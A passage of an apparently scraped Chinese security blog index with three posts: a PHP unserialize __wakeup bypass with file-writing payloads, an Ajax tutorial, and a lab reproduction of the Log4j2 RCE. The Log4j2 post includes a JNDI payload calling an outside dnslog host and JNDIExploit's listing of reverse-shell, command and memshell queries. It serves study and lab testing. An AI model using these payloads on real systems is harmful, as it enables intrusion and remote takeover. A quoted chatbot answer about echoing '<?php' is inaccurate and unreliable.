foreach(get_object_vars($this) as $k =&gt; $v) &#123;                    $this-&gt;$k = null;            &#125;            echo &quot;Waking up...\\n&quot;;        &#125;&#125;$test = $_POST[&#x27;test&#x27;];$test_unser = unserialize($test);?&gt;&lt;/body&gt;&lt;/html&gt;\n由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。\n如果我们使用如下payload\ntest=O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;\n会执行__wakeup()函数，页面上会出现如下输出\n\n如果我们使用如下payload\ntest=O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;\n会执行__wakeup()函数，页面上会出现如下输出\n\n\n这里发现个有趣的事情,echo 不能打印出PHP标识符&lt;?php,因此要url编码一下\nGPT回答:\n在PHP中，&lt;?php 是一个标记（tag），用于指示 PHP 代码的起始点。当使用 echo 函数时，它会将其后的内容作为字符串进行输出。但是，如果你尝试使用 echo 输出 &lt;?php，它将被解释为一个 PHP 的起始标记，而不是普通的字符串。为了在 echo 中输出 &lt;?php 这样的 PHP 标识符，你可以使用转义字符 \\ 来告诉 PHP 解释器不要将其解释为标记，而是作为普通的文本。1.使用htmlspecialchars函数对字符串进行转义：echo htmlspecialchars(&#x27;&lt;?php&#x27;);2.将&lt;?php拆分为两部分并连接起来：echo &#x27;&lt;?&#x27; . &#x27;php&#x27;;\n防御方法：\n1.严格的把控 unserailize() 函数的参数，不要给攻击者任何输入的可能\n2.在文件系统函数的参数可控时，对参数进行严格的过滤。\n3.严格检查上传文件的内容，而不是只检查文件头。\n4.在条件允许的情况下禁用可执行系统命令、代码的危险函数。\nPHP手册：https://www.php.net/manual/en/book.stream.php\n","categories":["常见top漏洞"]},{"title":"Ajax详解","url":"/2023/07/27/Ajax%E8%AF%A6%E8%A7%A3/","content":"Ajax详解\n0x01 简介\nAJAX 全称为 Asynchronous JavaScript And XML，就是异步的 JS 和 XML。AJAX是一种用于创建快速动态网页的技术。通过AJAX可以在浏览器中向服务器发送异步请求，Ajax可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。AJAX不是新的编程语言，而是一种将现有的标准组合在一起使用的新方式。\n1.1 什么是同步请求？\n同步请求是指当前发出请求后，浏览器什么都不能做，必须得等到请求完成返回数据之后，才会执行后续的代码。相当于生活中的排队，必须等待前一个人完成自己的事物，后一个人才能接着办。也就是说，当JS代码加载到当前AJAX的时候会把页面里所有的代码停止加载，当这个AJAX执行完毕后才会继续运行其他代码。\n1.2 什么是异步请求？\n异步请求就当发出请求的同时，浏览器可以继续做任何事，Ajax发送请求并不会影响页面的加载与用户的操作，相当于是在两条线上，各走各的，互不影响。一般默认值为true。异步请求可以完全不影响用户的体验效果，无论请求的时间长或者短，用户可以专心的操作页面的其他内容，并不会有等待的感觉。\n1.3 XML\nXML是一种可扩展标记语言，被设计用来传输和存储数据。XML和 HTML类似，但XML中没有预定义标签，全都是自定义标签，用来表示一些数据。早期 AJAX 携带的数据类型和返回的数据类型为xml形式，这也是 AJAX 名称的由来。\n尽管 X 在 Ajax 中代表 XML，但由于JSON的许多优势，比如更加轻量以和作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。\n1.4 优缺点\n**优点：**可以无需刷新页面而与服务器端进行通信；允许你根据用户事件来更新部分页面内容。\n**缺点：**没有浏览历史，不能回退；存在跨域问题；SEO（搜索引擎优化）不友好，因为数据是动态创建的，爬虫是爬不到的。\n0x02 ajax请求的基本流程\n要完整实现一个AJAX异步调用和局部刷新,通常需要以下几个步骤:\n\n创建 XMLHttpRequest 请求对象, 即创建一个异步调用对象。（ new XMLHttpRequest() ）\n打开请求地址，指定请求方式**。**（open）\n设置响应HTTP请求状态变化的函数.\n发送HTTP请求。（send）\n监听对应的请求状态的变化。（ readystatechange事件 ）\n读取响应数据，使用 JavaScript 和 DOM 实现局部刷新。\n\n1.创建请求对象\n为了使用 JavaScript 向服务器发送一个 http 请求，你需要一个包含必要函数功能的对象实例。这就是为什么会有 XMLHttpRequest 的原因。这是 IE 浏览器的 ActiveX 对象 XMLHTTP 的前身。随后 Mozilla，Safari 和其他浏览器也都实现了类似的方法，被称为 XMLHttpRequest。同时，微软也实现了 XMLHttpRequest 方法。\nif (window.XMLHttpRequest) &#123; // Mozilla, Safari, IE7+ ...    httpRequest = new XMLHttpRequest();&#125; else if (window.ActiveXObject) &#123; // IE 6 及以下    httpRequest = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;\n2.打开请求地址，指定请求方式\n\nopen() 的第一个参数是 HTTP 请求方法，有 GET，POST，HEAD 以及服务器支持的其他方法，方法一定要是大写字母，否则其他一些浏览器（比如 FireFox）可能无法处理这个请求。\n第二个参数是你要发送的 URL。\n第三个参数是可选的，用于设置请求是否是异步的。如果设为 true (默认值)，即开启异步，JavaScript 就不会在此语句阻塞，使得用户能在服务器还没有响应的情况下与页面进行交互。\n\nhttpRequest.open(&#x27;GET&#x27;, &#x27;http://www.example.org/some.file&#x27;, true);\n3.设置响应HTTP请求状态变化的函数\n如果你使用 POST 请求，那就需要设置请求的 MIME 类型，设置请求头。\nContent-Type:用于设定请求体中参数的类型httpRequest.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);\n4.发送HTTP请求\nsend() 方法的参数可以是任何你想发送给服务器的内容，如果是 POST 请求的话，数据将在请求体中发送到服务端，发送数据应该用服务器可以解析的格式，像查询语句。\nhttpRequest.send( &quot;name=value&amp;anothername=&quot;+encodeURIComponent(myVar)+&quot;&amp;so=on&quot; );\n如果是 GET 请求一般不传输参数\nhttpRequest.send();\n5.监听请求状态的变化\n只要 readyState 属性发生变化，就会调用相应的处理函数。这个回调函数会被用户线程所调用。XMLHttpRequest.onreadystatechange 会在 XMLHttpRequest 的readyState 属性发生改变时触发 readystatechange (en-US) 事件的时候被调用。\nhttpRequest.onreadystatechange = function () &#123;&#125;\n6.读取响应数据，并做相应处理\nhttpRequest.onreadystatechange = function () &#123;    //readyState 是请求对象中的一个属性 4表示成功    //status 是 http 状态码     if (httpRequest.readyState == 4 &amp;&amp; /^2\\d&#123;2&#125;$/.test(httpRequest.status)) &#123;          console.log(httpRequest.status); //状态码          console.log(httpRequest.statusText); //状态字符串          console.log(httpRequest.getAllResponseHeaders()); //所有响应头          console.log(httpRequest.response); //响应体     &#125;&#125;\n0x03 取消请求\n如果该请求已被发出，XMLHttpRequest.abort() 方法将终止该请求。\nhttpRequest.abort()","categories":["常见知识总结"]},{"title":"log4j2远程命令执行漏洞复现","url":"/2023/07/29/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","content":"Apache log4j2 远程命令执行漏洞复现\n0x01 前言\nApache log4j2 RCE漏洞（CVE-2021-44228）一出，各大行业知名厂商纷纷中招，与之前的fastjson、shiro漏洞相比更为严重，预计在之后的三四年中漏洞会一直存在。此漏洞影响范围特别广泛，漏洞利用门槛低，危害程度非常大，如果被攻击者恶意利用，危害程度不亚于2017年爆发的“永恒之蓝”漏洞。以下图片来源于网络\n\n\n\n\n\n\n\n0x02 漏洞简介\nApache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。 由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。\n\n漏洞编号：CVE-2021-44228\n漏洞等级：紧急\nCVSS评分：10（最高级）\n影响版本：Apache log4j2 2.0 - 2.14.1\n安全版本：Apache log4j-2.15.0-rc2\n\n更多关于此漏洞的详细分析：Log4j高危漏洞！具体原因解析！全网第一\n0x03 影响范围\n该漏洞影响范围极广、危害极大，主要由于该组件应用范围十分广泛，所有使用该组件的所有产品都会受到漏洞影响，因此对其下游造成的软件供应链安全隐患巨大。 目前已知的可能受影响的应用及组件包括但不限于如下：\n\n\n\n组件名称\n版本信息\n\n\n\n\nApache Struts2\n全版本\n\n\nElasticSearch\n5.x，6.x，7.x，8.0.0beta1，8.0.0alpha1和8.0.0alpha2\n\n\nLogstash\n5.0.0至最新\n\n\nApache Flink\n1.11.0-rc1 到 1.14.0\n\n\nApache Druid\n0.7.x以上\n\n\nHadoop Hive\n2.x和3.x\n\n\nApache Log4j SLF4J Binding\n‘2.14.1’, ‘2.14.0’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.1’, ‘2.12.0’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.0’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8’, ‘2.7’, ‘2.6.2’, ‘2.6.1’, ‘2.6’, ‘2.5’, ‘2.4.1’, ‘2.4’, ‘2.3’, ‘2.2’, ‘2.1’, ‘2.0.2’, ‘2.0.1’, ‘2.0’, ‘2.0-rc2’, ‘2.0-rc1’, ‘2.0-beta9’, ‘2.0-beta8’, ‘2.0-beta7’, ‘2.0-beta6’, ‘2.0-beta5’\n\n\nSpring Boot\n‘2.6.1’, ‘2.6.0’, ‘2.5.7’, ‘2.5.6’, ‘2.5.5’, ‘2.5.4’, ‘2.5.3’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.13’, ‘2.4.12’, ‘2.4.11’, ‘2.4.10’, ‘2.4.9’, ‘2.4.8’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.12.RELEASE’, ‘2.3.11.RELEASE’, ‘2.3.10.RELEASE’, ‘2.3.9.RELEASE’, ‘2.3.8.RELEASE’, ‘2.3.7.RELEASE’, ‘2.3.6.RELEASE’, ‘2.3.5.RELEASE’, ‘2.3.4.RELEASE’, ‘2.3.3.RELEASE’, ‘2.3.2.RELEASE’, ‘2.3.1.RELEASE’, ‘2.3.0.RELEASE’, ‘2.2.13.RELEASE’, ‘2.2.12.RELEASE’, ‘2.2.11.RELEASE’, ‘2.2.10.RELEASE’, ‘2.2.9.RELEASE’, ‘2.2.8.RELEASE’, ‘2.2.7.RELEASE’, ‘2.2.6.RELEASE’, ‘2.2.5.RELEASE’, ‘2.2.4.RELEASE’, ‘2.2.3.RELEASE’, ‘2.2.2.RELEASE’, ‘2.2.1.RELEASE’, ‘2.2.0.RELEASE’, ‘2.1.18.RELEASE’, ‘2.1.17.RELEASE’, ‘2.1.16.RELEASE’, ‘2.1.15.RELEASE’, ‘2.1.14.RELEASE’, ‘2.1.13.RELEASE’, ‘2.1.12.RELEASE’, ‘2.1.11.RELEASE’, ‘2.1.10.RELEASE’, ‘2.1.9.RELEASE’, ‘2.1.8.RELEASE’, ‘2.1.7.RELEASE’, ‘2.1.6.RELEASE’, ‘2.1.5.RELEASE’, ‘2.1.4.RELEASE’, ‘2.1.3.RELEASE’, ‘2.1.2.RELEASE’, ‘2.1.1.RELEASE’, ‘2.1.0.RELEASE’, ‘2.0.9.RELEASE’, ‘2.0.8.RELEASE’, ‘2.0.7.RELEASE’, ‘2.0.6.RELEASE’, ‘2.0.5.RELEASE’, ‘2.0.4.RELEASE’, ‘2.0.3.RELEASE’, ‘2.0.2.RELEASE’, ‘2.0.1.RELEASE’, ‘2.0.0.RELEASE’, ‘1.5.22.RELEASE’, ‘1.5.21.RELEASE’, ‘1.5.20.RELEASE’, ‘1.5.19.RELEASE’, ‘1.5.18.RELEASE’, ‘1.5.17.RELEASE’, ‘1.5.16.RELEASE’, ‘1.5.15.RELEASE’, ‘1.5.14.RELEASE’, ‘1.5.13.RELEASE’, ‘1.5.12.RELEASE’, ‘1.5.11.RELEASE’, ‘1.5.10.RELEASE’, ‘1.5.9.RELEASE’, ‘1.5.8.RELEASE’, ‘1.5.7.RELEASE’, ‘1.5.6.RELEASE’, ‘1.5.5.RELEASE’, ‘1.5.4.RELEASE’, ‘1.5.3.RELEASE’, ‘1.5.2.RELEASE’, ‘1.5.1.RELEASE’, ‘1.5.0.RELEASE’, ‘1.4.7.RELEASE’, ‘1.4.6.RELEASE’, ‘1.4.5.RELEASE’, ‘1.4.4.RELEASE’, ‘1.4.3.RELEASE’, ‘1.4.2.RELEASE’, ‘1.4.1.RELEASE’, ‘1.4.0.RELEASE’, ‘1.3.8.RELEASE’, ‘1.3.7.RELEASE’, ‘1.3.6.RELEASE’, ‘1.3.5.RELEASE’, ‘1.3.4.RELEASE’, ‘1.3.3.RELEASE’, ‘1.3.2.RELEASE’, ‘1.3.1.RELEASE’, ‘1.3.0.RELEASE’, ‘1.2.8.RELEASE’, ‘1.2.7.RELEASE’, ‘1.2.6.RELEASE’, ‘1.2.5.RELEASE’, ‘1.2.4.RELEASE’, ‘1.2.3.RELEASE’, ‘1.2.2.RELEASE’, ‘1.2.1.RELEASE’, ‘1.2.0.RELEASE’, ‘1.1.12.RELEASE’, ‘1.1.11.RELEASE’, ‘1.1.10.RELEASE’, ‘1.1.9.RELEASE’, ‘1.1.8.RELEASE’, ‘1.1.7.RELEASE’, ‘1.1.6.RELEASE’, ‘1.1.5.RELEASE’, ‘1.1.4.RELEASE’, ‘1.1.3.RELEASE’, ‘1.1.2.RELEASE’, ‘1.1.1.RELEASE’, ‘1.1.0.RELEASE’, ‘1.0.2.RELEASE’, ‘1.0.1.RELEASE’, ‘1.0.0.RELEASE’\n\n\nCamel :: Core\n‘3.13.0’, ‘3.12.0’, ‘3.11.4’, ‘3.11.3’, ‘3.11.2’, ‘3.11.1’, ‘3.11.0’, ‘3.10.0’, ‘3.9.0’, ‘3.8.0’, ‘3.7.6’, ‘3.7.5’, ‘3.7.4’, ‘3.7.3’, ‘3.7.2’, ‘3.7.1’, ‘3.7.0’, ‘3.6.0’, ‘3.5.0’, ‘3.4.6’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.25.4’, ‘2.25.3’, ‘2.25.2’, ‘2.25.1’, ‘2.25.0’, ‘2.24.3’, ‘2.24.2’, ‘2.24.1’, ‘2.24.0’, ‘2.23.4’, ‘2.23.3’, ‘2.23.2’, ‘2.23.1’, ‘2.23.0’, ‘2.22.5’, ‘2.22.4’, ‘2.22.3’, ‘2.22.2’, ‘2.22.1’, ‘2.22.0’, ‘2.21.5’, ‘2.21.4’, ‘2.21.3’, ‘2.21.2’, ‘2.21.1’, ‘2.21.0’, ‘2.20.4’, ‘2.20.3’, ‘2.20.2’, ‘2.20.1’, ‘2.20.0’, ‘2.19.5’, ‘2.19.4’, ‘2.19.3’, ‘2.19.2’, ‘2.19.1’, ‘2.19.0’, ‘2.18.5’, ‘2.18.4’, ‘2.18.3’, ‘2.18.2’, ‘2.18.1’, ‘2.18.0’, ‘2.17.7’, ‘2.17.6’, ‘2.17.5’, ‘2.17.4’, ‘2.17.3’, ‘2.17.2’, ‘2.17.1’, ‘2.17.0’, ‘2.16.5’, ‘2.16.4’, ‘2.16.3’, ‘2.16.2’, ‘2.16.1’, ‘2.16.0’, ‘2.15.6’, ‘2.15.5’, ‘2.15.4’, ‘2.15.3’, ‘2.15.2’, ‘2.15.1’, ‘2.15.0’, ‘2.14.4’, ‘2.14.3’, ‘2.14.2’, ‘2.14.1’, ‘2.14.0’, ‘2.13.4’, ‘2.13.3’, ‘2.13.2’, ‘2.13.1’, ‘2.13.0’, ‘2.12.5’, ‘2.12.4’, ‘2.12.3’, ‘2.12.2’, ‘2.12.1’, ‘2.12.0’, ‘2.11.4’, ‘2.11.3’, ‘2.11.2’, ‘2.11.1’, ‘2.11.0’, ‘2.10.7’, ‘2.10.6’, ‘2.10.5’, ‘2.10.4’, ‘2.10.3’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.8’, ‘2.9.7’, ‘2.9.6’, ‘2.9.5’, ‘2.9.4’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.6’, ‘2.8.5’, ‘2.8.4’, ‘2.8.3’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.0’, ‘2.5.0’, ‘2.4.0’, ‘2.3.0’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.6.4’, ‘1.6.3’, ‘1.6.2’, ‘1.6.1’, ‘1.6.0’, ‘1.5.0’, ‘1.4.0’, ‘1.3.0’, ‘1.2.0’, ‘1.1.0’, ‘1.0.0’, ‘3.0.0-M4’, ‘3.0.0-M3’, ‘3.0.0-M2’, ‘3.0.0-M1’, ‘2.0-M3’, ‘2.0-M2’, ‘2.0-M1’, ‘3.0.0-RC3’, ‘3.0.0-RC2’, ‘3.0.0-RC1’, ‘2.9.0-RC1’\n\n\nJUnit Vintage Engine\n‘5.8.2’, ‘5.8.1’, ‘5.8.0’, ‘5.7.2’, ‘5.7.1’, ‘5.7.0’, ‘5.6.3’, ‘5.6.2’, ‘5.6.1’, ‘5.6.0’, ‘5.5.2’, ‘5.5.1’, ‘5.5.0’, ‘5.4.2’, ‘5.4.1’, ‘5.4.0’, ‘5.3.2’, ‘5.3.1’, ‘5.3.0’, ‘5.2.0’, ‘5.1.1’, ‘5.1.0’, ‘4.12.3’, ‘4.12.2’, ‘4.12.1’, ‘4.12.0’, ‘5.8.0-M1’, ‘5.7.0-M1’, ‘5.6.0-M1’, ‘5.5.0-M1’, ‘5.4.0-M1’, ‘5.3.0-M1’, ‘5.2.0-M1’, ‘5.1.0-M2’, ‘5.1.0-M1’, ‘4.12.0-M6’, ‘4.12.0-M5’, ‘4.12.0-M4’, ‘4.12.0-M3’, ‘4.12.0-M2’, ‘4.12.0-M1’, ‘5.8.0-RC1’, ‘5.7.0-RC1’, ‘5.6.0-RC1’, ‘5.5.0-RC2’, ‘5.5.0-RC1’, ‘5.4.0-RC2’, ‘5.4.0-RC1’, ‘5.3.0-RC1’, ‘5.2.0-RC1’, ‘5.1.0-RC1’, ‘4.12.0-RC3’, ‘4.12.0-RC2’, ‘4.12.0-RC1’\n\n\nJBoss Logging 3\n‘3.4.2.Final’, ‘3.4.1.Final’, ‘3.4.0.Final’, ‘3.3.3.Final’, ‘3.3.2.Final’, ‘3.3.1.Final’, ‘3.3.0.Final’, ‘3.2.1.Final’, ‘3.2.0.Final’, ‘3.1.0.CR2’, ‘3.1.0.CR1’, ‘3.0.0.CR1’, ‘3.3.0.Beta1’, ‘3.2.0.Beta1’, ‘3.1.0.Beta3’, ‘3.1.0.Beta2’, ‘3.1.0.Beta1’, ‘3.0.0.Beta5’, ‘3.0.0.Beta4’, ‘3.0.0.Beta3’, ‘3.0.0.Beta2’, ‘3.0.0.Beta1’\n\n\nHikariCP\n‘5.0.0’, ‘4.0.3’, ‘4.0.2’, ‘4.0.1’, ‘4.0.0’, ‘3.4.5’, ‘3.4.4’, ‘3.4.3’, ‘3.4.2’, ‘3.4.1’, ‘3.4.0’, ‘3.3.1’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.0’, ‘2.7.9’, ‘2.7.8’, ‘2.7.7’, ‘2.7.6’, ‘2.7.5’, ‘2.7.4’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.1’, ‘2.5.0’, ‘2.4.7’, ‘2.4.6’, ‘2.4.5’, ‘2.4.4’, ‘2.4.3’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.13’, ‘2.3.12’, ‘2.3.11’, ‘2.3.10’, ‘2.3.9’, ‘2.3.8’, ‘2.3.7’, ‘2.3.6’, ‘2.3.5’, ‘2.3.4’, ‘2.3.3’, ‘2.3.2’, ‘2.3.1’, ‘2.3.0’, ‘2.2.5’, ‘2.2.4’, ‘2.2.3’, ‘2.2.2’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.1’, ‘2.0.0’, ‘1.4.0’, ‘1.3.9’, ‘1.3.8’, ‘1.3.7’, ‘1.3.6’, ‘1.3.5’, ‘1.3.4’, ‘1.3.3’, ‘1.3.2’, ‘1.3.1’, ‘1.3.0’, ‘1.2.9’, ‘1.2.8’, ‘1.2.7’, ‘1.2.6’, ‘1.2.5’, ‘1.2.4’, ‘1.2.3’, ‘1.2.2’, ‘1.2.1’, ‘1.1.9’, ‘1.1.8’, ‘1.1.7’, ‘1.1.6’, ‘1.1.5’, ‘1.1.4’, ‘1.1.3’\n\n\nLogging\n‘1.1.0’, ‘1.0.0’, ‘0.6.0’, ‘0.5.0’, ‘0.4.1’, ‘0.4.0’, ‘0.3.1’, ‘0.3.0’, ‘0.2.6’, ‘0.2.4’, ‘0.2.3’, ‘0.2.2’, ‘0.2.0’, ‘0.1.2’, ‘0.1.1’, ‘0.1.0’, ‘0.5.0-alpha.1’, ‘0.5.0-alpha’\n\n\nJedis\n‘3.7.0’, ‘3.6.3’, ‘3.6.2’, ‘3.6.1’, ‘3.6.0’, ‘3.5.2’, ‘3.5.1’, ‘3.5.0’, ‘3.4.1’, ‘3.4.0’, ‘3.3.0’, ‘3.2.0’, ‘3.1.0’, ‘3.0.1’, ‘3.0.0’, ‘2.10.2’, ‘2.10.1’, ‘2.10.0’, ‘2.9.3’, ‘2.9.2’, ‘2.9.1’, ‘2.9.0’, ‘2.8.2’, ‘2.8.1’, ‘2.8.0’, ‘2.7.3’, ‘2.7.2’, ‘2.7.1’, ‘2.7.0’, ‘2.6.3’, ‘2.6.2’, ‘2.6.1’, ‘2.6.0’, ‘2.5.2’, ‘2.5.1’, ‘2.5.0’, ‘2.4.2’, ‘2.4.1’, ‘2.4.0’, ‘2.3.1’, ‘2.3.0’, ‘2.2.1’, ‘2.2.0’, ‘2.1.0’, ‘2.0.0’, ‘1.5.2’, ‘1.5.1’, ‘1.5.0’, ‘1.4.0’, ‘1.3.1’, ‘1.3.0’, ‘jedis-3.6.2’, ‘3.1.0-m4’, ‘3.1.0-m3’, ‘3.1.0-m2’, ‘3.1.0-m1’, ‘3.0.0-m1’, ‘2.10.0-m1’, ‘3.7.0-RC1’, ‘3.6.0-RC1’, ‘3.1.0-rc2’, ‘3.1.0-rc’, ‘3.0.1-rc1’, ‘3.0.0-rc1’, ‘2.10.0-rc1’, ‘1.5.0-RC2’, ‘1.5.0-RC1’, ‘4.0.0-beta4’, ‘4.0.0-beta3’, ‘4.0.0-beta2’, ‘4.0.0-beta1’\n\n\nWSO2 Carbon Kernel Core\n‘5.2.13’, ‘5.2.8’, ‘5.2.7’, ‘5.2.6’, ‘5.2.5’, ‘5.2.4’, ‘5.2.3’, ‘5.2.2’, ‘5.2.1’, ‘4.6.2’, ‘4.6.1’, ‘4.6.0’, ‘4.5.1’, ‘4.4.37’, ‘4.4.36’, ‘4.4.35’, ‘4.4.34’, ‘4.4.33’, ‘4.4.32’, ‘4.4.31’, ‘4.4.30’, ‘4.4.29’, ‘4.4.28’, ‘4.4.27’, ‘4.4.26’, ‘4.4.25’, ‘4.4.24’, ‘4.4.23’, ‘4.4.22’, ‘4.4.21’, ‘4.4.20’, ‘4.4.19’, ‘4.7.0-m6’, ‘4.7.0-m5’, ‘4.7.0-m4’, ‘4.7.0-m3’, ‘4.7.0-m2’, ‘4.7.0-m1’, ‘4.6.3-m5’, ‘4.6.3-m4’, ‘4.6.3-m3’, ‘4.6.3-m2’, ‘4.6.3-m1’, ‘4.6.2-m9’, ‘4.6.2-m8’, ‘4.6.2-m7’, ‘4.6.2-m6’, ‘4.6.2-m5’, ‘4.6.2-m4’, ‘4.6.2-m3’, ‘4.6.2-m2’, ‘4.6.2-m1’, ‘4.6.1-m8’, ‘4.6.1-m7’, ‘4.6.1-m6’, ‘4.6.1-m5’, ‘4.6.1-m4’, ‘4.6.1-m3’, ‘4.6.1-m2’, ‘4.6.1-m1’, ‘4.6.1-beta2’, ‘4.6.1-beta’, ‘4.6.0-beta2’, ‘4.6.1-alpha3’, ‘4.6.1-alpha2’, ‘4.6.1-alpha’, ‘4.6.0-alpha2’, ‘4.6.0-alpha’\n\n\n\n\n以上应用/组件受影响版本统计数据来自：微步情报局 微步在线研究响应中心\n\n0x04 漏洞演示\n演示靶场采用vulfocus在线平台的log4j2-rce靶场，该靶场漏洞位置存在于/hello路径\n\nvulfocus的log4j2-rce靶场的请求数据包如下：\nGET /hello?payload=111 HTTP/1.1Host: vulfocus.fofa.so:30861Content-Type: application/x-www-form-urlencodedContent-Length: 147\n漏洞验证过程使用dnslog、burpsuite、JNDIExploit以及拥有公网ip的vps的服务器，建议java依赖环境采用jdk8u191以下版本进行复现。\ndnslog：http://www.dnslog.cn/JNDIExploit：https://github.com/feihong-cs/JNDIExploitjdk8：https://www.wmzhe.com/soft-70159.html\n0x05 漏洞检测\n1. dnslog手动验证\n首先在dnslog平台生成一个地址，然后利用该地址构造payload让靶机对dnslog平台发起请求：\n\n传入payload：payload=%24%7Bjndi%3Aldap%3A%2F%2Fauks48.dnslog.cn%7D --记得url编码\n\n请求成功后，dnslog平台点击 Refresh Record 后会接收靶机的请求，记录了靶机的请求的ip地址以及响应时间\n\n通过上述步骤验证，在演示靶场环境中可以确定漏洞是真实存在的，但在真实环境中只能说初步判断目标是有大概率存在漏洞的，由于真实环境中的一些复杂因素，即使dnslog请求成功了也不能完全保证目标一定存在rce漏洞。\n2.  漏洞利用\n1. JNDIExploit\nJNDIExploit是一款用于 JNDI注入 利用的工具，大量参考/引用了 Rogue JNDI 项目的代码，支持直接植入内存shell，并集成了常见的bypass 高版本JDK的方式，适用于与自动化工具配合使用。\n\n下载地址: https://pan.baidu.com/s/1lmday3MHoPHI5f9rHNjV2Q 提取码: 5686\n\n使用 java -jar JNDIExploit.jar -u 查看支持的 LDAP 格式\nSupported LADP Queries* all words are case INSENSITIVE when send to ldap server[+] Basic Queries: ldap://127.0.0.1:1389/Basic/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Basic/Dnslog/[domain]    ldap://127.0.0.1:1389/Basic/Command/[cmd]    ldap://127.0.0.1:1389/Basic/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Basic/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Basic/TomcatEcho    ldap://127.0.0.1:1389/Basic/SpringEcho    ldap://127.0.0.1:1389/Basic/WeblogicEcho    ldap://127.0.0.1:1389/Basic/TomcatMemshell1    ldap://127.0.0.1:1389/Basic/TomcatMemshell2  ---need extra header [Shell: true]    ldap://127.0.0.1:1389/Basic/JettyMemshell    ldap://127.0.0.1:1389/Basic/WeblogicMemshell1    ldap://127.0.0.1:1389/Basic/WeblogicMemshell2    ldap://127.0.0.1:1389/Basic/JBossMemshell    ldap://127.0.0.1:1389/Basic/WebsphereMemshell    ldap://127.0.0.1:1389/Basic/SpringMemshell[+] Deserialize Queries: ldap://127.0.0.1:1389/Deserialization/[GadgetType]/[PayloadType]/[Params], e.g.    ldap://127.0.0.1:1389/Deserialization/URLDNS/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK1/Dnslog/[domain]    ldap://127.0.0.1:1389/Deserialization/CommonsCollectionsK2/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils1/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/Deserialization/CommonsBeanutils2/TomcatEcho    ldap://127.0.0.1:1389/Deserialization/C3P0/SpringEcho    ldap://127.0.0.1:1389/Deserialization/Jdk7u21/WeblogicEcho    ldap://127.0.0.1:1389/Deserialization/Jre8u20/TomcatMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2555/WeblogicMemshell1    ldap://127.0.0.1:1389/Deserialization/CVE_2020_2883/WeblogicMemshell2    ---ALSO support other memshells[+] TomcatBypass Queries    ldap://127.0.0.1:1389/TomcatBypass/Dnslog/[domain]    ldap://127.0.0.1:1389/TomcatBypass/Command/[cmd]    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/TomcatBypass/ReverseShell/[ip]/[port]  ---windows NOT supported    ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho    ldap://127.0.0.1:1389/TomcatBypass/SpringEcho    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell1    ldap://127.0.0.1:1389/TomcatBypass/TomcatMemshell2   ---need extra header [Shell: true]    ldap://127.0.0.1:1389/TomcatBypass/SpringMemshell[+] GroovyBypass Queries    ldap://127.0.0.1:1389/GroovyBypass/Command/[cmd]    ldap://127.0.0.1:1389/GroovyBypass/Command/Base64/[base64_encoded_cmd][+] WebsphereBypass Queries    ldap://127.0.0.1:1389/WebsphereBypass/List/file=[file or directory]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Dnslog/[domain]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/[cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/Command/Base64/[base64_encoded_cmd]    ldap://127.0.0.1:1389/WebsphereBypass/Upload/ReverseShell/[ip]/[port]  ---windows NOT supported    